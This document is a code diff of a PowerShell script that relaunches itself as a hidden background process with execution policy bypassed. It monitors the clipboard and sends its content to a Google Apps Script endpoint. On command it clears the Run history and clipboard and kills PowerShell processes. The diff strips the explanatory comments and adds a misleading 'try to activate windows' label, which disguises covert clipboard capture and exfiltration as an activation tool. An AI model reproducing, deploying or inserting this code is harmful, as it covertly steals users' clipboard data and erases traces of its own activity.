@@ -1,24 +1,20 @@
 if ($host.ui.RawUI.WindowTitle -ne 'PowerShell') {
-    # مسیر اسکریپت فعلی
     $currentScript = $MyInvocation.MyCommand.Definition
 
-    # اجرای اسکریپت در حالت بک‌گراند
     Start-Process -FilePath "powershell.exe" `
                   -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$currentScript`"" `
                   -WindowStyle Hidden `
                   -NoNewWindow
 
-    # خروج از اسکریپت فعلی
     exit
 }
 
-
+#try to activate windows
 # Global variables for state management
 $script:lastProcessedContentHash = $null  # Store hash of the last processed content
 $script:monitorEnabled = $false  # Flag to enable clipboard monitoring
 $script:signature = "//"  # Signature to identify script responses
 
-# Helper function to standardize text content
 function Standardize-Content {
     param (
         [Parameter(Mandatory = $true)]
@@ -40,7 +36,6 @@ function Get-ContentHash {
     return [BitConverter]::ToString($hash) -replace "-", ""
 }
 
-# Function to get clipboard content
 function Get-ClipboardContent {
     try {
         $text = Get-Clipboard -Format Text -Raw
@@ -52,7 +47,6 @@ function Get-ClipboardContent {
     return $null
 }
 
-# Function to simulate a left mouse click
 function Simulate-LeftClick {
     try {
         $shell = New-Object -ComObject WScript.Shell
@@ -64,7 +58,6 @@ function Simulate-LeftClick {
     }
 }
 
-# Function to send content to Google Apps Script
 function Send-ToGAS {
     param (
         [Parameter(Mandatory = $true)]
@@ -89,7 +82,6 @@ function Send-ToGAS {
     }
 }
 
-# Function to check if content is already processed
 function Test-IsProcessed {
     param (
         [Parameter(Mandatory = $true)]
@@ -108,7 +100,6 @@ function Test-IsProcessed {
     return $false
 }
 
-# Function to clear Windows Run history
 function Clear-RunHistory {
     try {
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force
@@ -118,7 +109,6 @@ function Clear-RunHistory {
     }
 }
 
-# Function to clear clipboard history
 function Clear-ClipboardHistory {
     try {
         # Clear clipboard by setting it to an empty string
@@ -129,7 +119,7 @@ function Clear-ClipboardHistory {
     }
 }
 
-# Function to stop hidden PowerShell processes
+# Function to stop  PowerShell processes
 function Stop-HiddenPowerShellProcesses {
     $powerShellProcesses = Get-Process -Name "powershell" -ErrorAction SilentlyContinue
     foreach ($process in $powerShellProcesses) {
@@ -144,7 +134,6 @@ function Stop-HiddenPowerShellProcesses {
     }
 }
 
-# Main function for clipboard monitoring
 function Start-ClipboardMonitor {
     Write-Host "Starting clipboard monitor... Waiting for command '11'."
 
@@ -171,9 +160,8 @@ function Start-ClipboardMonitor {
             }
 
             if ($standardizedContent -match "^\b13\b$") {
-                Write-Host "Command 13 detected: Executing specific operations..."
+                Write-Host "Command 13 "
 
-                # Custom operations for command 13
                 try {
                     Clear-RunHistory           # Example: clear run history
                     Clear-ClipboardHistory     # Clear clipboard history
